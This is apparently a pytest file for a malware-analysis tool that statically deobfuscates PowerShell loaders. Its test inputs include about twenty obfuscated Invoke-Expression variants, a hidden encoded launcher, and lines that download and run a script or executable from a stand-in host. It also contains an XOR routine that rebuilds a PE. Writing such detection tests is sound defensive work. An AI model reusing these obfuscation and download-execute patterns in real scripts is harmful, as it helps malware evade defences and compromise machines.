"""Improve languages, phase 1: PowerShell evaluated statically to what it runs, loads or writes.

The evaluator follows variables, here-strings, functions with parameters, loops and the .NET
calls loaders use, so a two-layer loader (AES + GZip → a script that rebuilds a DLL and a PE and
hands them to a loader by reflection) is resolved to both binaries. Commands with computed names
are resolved; downloads and calls that depend on the victim's machine are reported.
"""

from __future__ import annotations

import base64
import json
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent))
from test_js_techniques import _analyze, _ms, client  # noqa: E402,F401

from docutracex.resolve import ps_eval  # noqa: E402

STAGE = "Write-Host 'factura 2026-0187'"


@pytest.mark.parametrize("code", [
    "& (\"Inv\"+\"oke-Ex\"+\"pression\") $s",
    "& ('{1}{0}' -f 'ression','Invoke-Exp') $s",
    ".( $env:ComSpec[4,15,25] -join '') $s",
    "& ($PSHome[4]+$PSHome[30]+'x') $s",
    "& ($ShellId[1]+$ShellId[13]+'x') $s",
    "I`E`X $s",
    "InVoKe-ExPrEsSiOn $s",
    "&(gcm I*e-E*n) $s",
    "& (Get-Command *ke-Exp*) $s",
    "Set-Alias x iex; x $s",
    "sal y Invoke-Expression; y $s",
    "$ExecutionContext.InvokeCommand.InvokeScript($s)",
    "[ScriptBlock]::Create($s).Invoke()",
    "& ([string]::Join('', [char[]](73,69,88))) $s",
    "& ('noisserpxE-ekovnI'[-1..-100] -join '') $s",
    "$a='Inv';$b='oke-Expression';& ($a+$b) $s",
    "$s | iex",
    "$s | & (gcm i*x)",
    "$t=[Type]('Sys'+'tem.Convert'); iex ([Text.Encoding]::UTF8.GetString($t::FromBase64String($b)))",
    "if ([math]::Sqrt(16) -eq 4) { iex $s } else { iex 'never' }",
    "iex (gv s -ValueOnly)",
    "powershell -nop -w hidden -enc " + base64.b64encode(STAGE.encode("utf-16-le")).decode(),
])
def test_computed_invoke_expression(code: str) -> None:
    pre = f"$s = \"{STAGE}\"; $b = '{base64.b64encode(STAGE.encode()).decode()}'\n"
    sinks = ps_eval.resolve(pre + code)
    assert [st.data for st in sinks.stages if st.kind == "exec"] == [STAGE], (code, sinks.errors)
    assert "never" not in [st.data for st in sinks.stages]


def test_downloads_and_unresolved_calls() -> None:
    s = ps_eval.resolve(
        "$w = New-Object ('Net.Web'+'Client'); $w.('Down'+'loadString')('https://billing-portal.example/a.ps1') | iex\n"
        "Invoke-WebRequest -Uri https://billing-portal.example/x.exe -OutFile $env:TEMP\\x.exe; Start-Process $env:TEMP\\x.exe\n"
        "& (Get-ItemProperty 'HKCU:\\Software\\x').Run\n")
    d = {x["url"]: x for x in s.downloads}
    assert d["https://billing-portal.example/a.ps1"]["use"].startswith("runs it as code")
    assert d["https://billing-portal.example/x.exe"]["saved_to"] == "%TEMP%\\x.exe"
    assert s.unresolved and "registry" in s.unresolved[0]["depends_on"]
    f = {x["rule"] for x in s.findings("x.ps1")}
    assert {"powershell_resolved_download", "powershell_unresolved_dynamic_call"} <= f


def test_inplace_loop_and_function_recipe() -> None:
    s = ps_eval.resolve(
        "function Open-Blob($b64, $k) { $d = [Convert]::FromBase64String($b64); "
        "for ($i = 0; $i -lt $d.Length; $i++) { $d[$i] = $d[$i] -bxor $k }; $d }\n"
        f"$img = Open-Blob '{base64.b64encode(bytes(b ^ 0x5A for b in b'MZ' + bytes(200))).decode()}' 0x5a\n")
    st = next(x for x in s.stages if x.kind == "load")
    assert st.data[:2] == b"MZ" and "xor(0x5a)" in st.recipe and "base64" in st.recipe


def test_watch_loop_is_bounded() -> None:
    s = ps_eval.resolve("$n = 0; while ($true) { $n++; Start-Sleep 5 }; iex 'Write-Host after'")
    assert s.stats["seconds"] < 5


def test_layered_loader_sample_end_to_end(client) -> None:  # noqa: ANN001,F811
    """The two-layer loader: the stage-2 script in Nested with its recipe, and under it the DLL
    (base64 → XOR text key → base64) and the PE handed to the loader with aspnet_compiler."""
    _cid, res = _analyze(client, "sample_layered_loader.ps1", _ms().layered_loader_ps1())
    tree = json.loads((res / "nested.json").read_text())["tree"]
    st2 = next(n for n in tree if n["filename"].endswith(".ps1"))
    assert st2["recipe"][:1] == ["here-string $P"] and any(r.startswith("aes-256-cbc(key $K, iv $V)") for r in st2["recipe"])
    assert "gzip" in st2["recipe"]
    kids = {(c.get("format"), c["recipe"][0]) for c in st2["children"]}
    assert ("PE", "literal $frag") in kids and ("PE", "number array $data") in kids
    rules = {f["rule"] for f in json.loads((res / "powershell.json").read_text())["findings"]}
    assert {"ps_resolved_stages", "ps_layered_loader_integrity"} <= rules
    child_rules = {f["rule"] for f in st2["findings"]}
    assert {"ps_reflective_invoke", "ps_reflective_host_injection", "ps_process_watch_loop"} <= child_rules
    ps = json.loads((res / "powershell.json").read_text())["scripts"][0]
    assert ps["resolution"]["stages"][0]["sink"] == "ScriptBlock::Create"


def test_computed_names_sample(client) -> None:  # noqa: ANN001,F811
    _cid, res = _analyze(client, "sample_computed_names.ps1", _ms().computed_names_ps1())
    ps = json.loads((res / "powershell.json").read_text())
    rules = {f["rule"] for f in ps["findings"]}
    assert {"powershell_resolved_download", "powershell_unresolved_dynamic_call"} <= rules
    res_ = ps["scripts"][0]["resolution"]
    assert len([s for s in res_["stages"] if s["kind"] == "exec"]) == 7
    iocs = {i["value"] for i in json.loads((res / "iocs.json").read_text())["iocs"]}
    assert "https://billing-portal.example/inv/s3.ps1" in iocs
